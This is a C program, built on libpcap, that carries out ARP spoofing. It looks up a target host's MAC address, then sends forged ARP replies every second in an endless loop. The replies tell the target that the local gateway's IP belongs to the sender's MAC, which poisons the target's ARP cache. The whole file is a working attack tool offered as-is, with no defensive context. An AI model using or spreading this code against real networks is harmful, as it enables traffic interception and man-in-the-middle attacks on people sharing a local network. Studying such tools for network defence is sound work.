#include <netinet/in.h> // for ntohs() function
#include <pcap.h>       // for packet capturing
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>     // for sleep()
//for structure
#include <netinet/ether.h>
#include <arpa/inet.h>
//custom headerfile
#include "getLocalAddress.h"

void init_pcd(pcap_t **pcd, char **dev);
int  convertIP2MAC(pcap_t *pcd, const struct in_addr IP, struct ether_addr *MAC);
void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
                              const struct in_addr fakeIP,   const struct ether_addr fakeMAC);
void makeARPpacket(u_char *packet, const struct in_addr sendIP, const struct ether_addr sendMAC,
                                   const struct in_addr recvIP, const struct ether_addr recvMAC, uint16_t ARPop);

int main(int argc, char **argv)
{
    pcap_t *pcd;
    char *dev;

    struct in_addr      targetIP;
    struct ether_addr   targetMAC; 

    // init
    printf("pcd init ...");
    init_pcd(&pcd, &dev);
    printf("done\n");

    // check input and specify target
    printf("getting target's MAC address ...");
    if(inet_aton(argv[1], &targetIP)==0)
    {
        printf("\nError: invalid IP : %s \n", argv[1]);
        exit(1);
    }
    if(convertIP2MAC(pcd, targetIP, &targetMAC)==-1)
    {
        printf("\nError: given IP(%s) is not in the same network.\n", argv[1]);
        exit(1);
    }
    printf("done.\n");

    // send fake ARP
    printf("start sending fake ARP\n");    
    sendFakeARP(pcd, targetIP, targetMAC, getGatewayIP(), getMyAddr().MAC);

    return 0;
}

void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
                              const struct in_addr fakeIP,   const struct ether_addr fakeMAC)
{
    u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];

    makeARPpacket(packet, fakeIP, fakeMAC, targetIP, targetMAC, ARPOP_REPLY);

    while(1)
    {
        // sending
        if(pcap_inject(pcd, packet, sizeof(packet))==-1)
        {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        }
        sleep(1);
    }

    return;
}


void init_pcd(pcap_t **pcd, char **dev)
{
    char errbuf[PCAP_ERRBUF_SIZE];

    *dev = pcap_lookupdev(errbuf);

    if(dev == NULL)
    {
        printf("%s\n",errbuf);
        exit(1);
    }
    
    *pcd = pcap_open_live(*dev, BUFSIZ,  0/*NONPROMISCUOUS*/, -1, errbuf);

    if (*pcd == NULL)
    {
        printf("%s\n", errbuf);
        exit(1);
    }

    return;
}

int convertIP2MAC(pcap_t *pcd, const struct in_addr IP, struct ether_addr *MAC)
{
    int status;
    struct ether_addr BcastMAC;
    struct ether_header *etherHdr;
    struct ether_arp *arpHdr;

    struct pcap_pkthdr *recvHeader;
    const u_char *recvPacket;
    u_char sendPacket[sizeof(struct ether_header) + sizeof(struct ether_arp)];

    // check if it's in the same network
    if((getMyAddr().IP.s_addr & getMyAddr().subMask.s_addr)
         != (IP.s_addr & getMyAddr().subMask.s_addr))
        return -1;

    // make ARP REQUEST packet
    ether_aton_r("ff:ff:ff:ff:ff:ff", &BcastMAC);
    makeARPpacket(sendPacket, getMyAddr().IP, getMyAddr().MAC, IP, BcastMAC, ARPOP_REQUEST);
    
    // send and get ARP response
    while(1)
    {
        // send Request
        if(pcap_inject(pcd, sendPacket, sizeof(sendPacket))==-1)
        {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        }

        // get Response
        status = pcap_next_ex(pcd, &recvHeader, &recvPacket);
        if(status!=1)
            continue;

        // check if it's ARP packet
        etherHdr = (struct ether_header*)recvPacket;
        if(etherHdr->ether_type!=htons(ETHERTYPE_ARP))
            continue;
        
        // check if it's 1)ARP Reply 2)from the desired source
        arpHdr = (struct ether_arp*)(recvPacket + sizeof(struct ether_header));
        if(arpHdr->arp_op != htons(ARPOP_REPLY))
            continue;
        if(memcmp(&arpHdr->arp_spa, &IP.s_addr, sizeof(in_addr_t))!=0)
            continue;

        // if so, copy MAC addr
        memcpy(&MAC->ether_addr_octet, &arpHdr->arp_sha, ETHER_ADDR_LEN);

        break;
    }


    return 0;
}

void makeARPpacket(u_char *packet, const struct in_addr sendIP, const struct ether_addr sendMAC,
                                   const struct in_addr recvIP, const struct ether_addr recvMAC, uint16_t ARPop)
{
    struct ether_header etherHdr;
    struct ether_arp arpHdr;

    // Ethernet part
    etherHdr.ether_type = htons(ETHERTYPE_ARP);
    memcpy(etherHdr.ether_dhost, &recvMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(etherHdr.ether_shost, &sendMAC.ether_addr_octet, ETHER_ADDR_LEN);

    // ARP part
    arpHdr.arp_hrd = htons(ARPHRD_ETHER);
    arpHdr.arp_pro = htons(ETHERTYPE_IP);
    arpHdr.arp_hln = ETHER_ADDR_LEN;
    arpHdr.arp_pln = sizeof(in_addr_t);
    arpHdr.arp_op  = htons(ARPop);
    memcpy(&arpHdr.arp_sha, &sendMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(&arpHdr.arp_spa, &sendIP.s_addr, sizeof(in_addr_t));
    memcpy(&arpHdr.arp_tha, &recvMAC.ether_addr_octet, ETHER_ADDR_LEN);
    memcpy(&arpHdr.arp_tpa, &recvIP.s_addr, sizeof(in_addr_t));

    // build packet
    memcpy(packet, &etherHdr, sizeof(struct ether_header));
    memcpy(packet+sizeof(struct ether_header), &arpHdr, sizeof(struct ether_arp));

    return;
}